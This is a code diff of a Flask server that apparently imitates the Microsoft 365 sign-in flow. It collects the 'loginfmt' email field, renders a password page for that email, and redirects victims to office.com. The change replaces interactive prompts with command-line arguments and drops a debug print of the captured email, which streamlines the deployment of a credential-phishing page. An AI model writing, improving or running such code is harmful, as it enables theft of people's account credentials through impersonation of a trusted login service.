@@ -2,21 +2,11 @@ from flask import Flask, request, render_template, send_file, redirect
 from werkzeug.datastructures import RequestCacheControl
 import os
 
-url = input("Enter redirect URL (https://www.office.com/?auth=2): ")
+from sys import argv
 
-if url == "":
-    url = "https://www.office.com/?auth=2"
-
-host = input("Flask server host (localhost): ")
-
-if host == "":
-    host = "localhost"
-
-port = input('Flask server port (80): ')
-if port=="":
-    port= 80
-else:
-    port=int(port)
+url = argv[1]
+host= argv[2]
+port= int(argv[3])
 app = Flask(__name__)
 @app.route("/")
 def hell():
@@ -27,7 +17,6 @@ def hell():
 @app.route("/" , methods=["POST"])
 def passwd():
     data = request.form.to_dict(flat=False)
-    print(data["loginfmt"])
     return render_template("password.html" , email=data["loginfmt"][0])
 @app.route("/login.php" , methods=["POST", "GET"])
 def reorient():
